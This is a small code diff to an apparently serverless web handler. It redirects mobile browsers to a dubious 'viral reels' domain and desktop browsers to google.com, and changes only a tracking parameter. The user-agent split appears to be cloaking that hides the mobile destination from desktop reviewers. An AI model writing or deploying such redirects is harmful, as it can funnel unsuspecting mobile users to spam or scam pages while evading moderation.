@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://viral.reelsvideos.top/bai66viral/?utm_source=amsh&utm_medium=amsh", 302);
+    return Response.redirect("https://viral.reelsvideos.top/bai66viral/?utm_source=suny&utm_medium=amsh", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
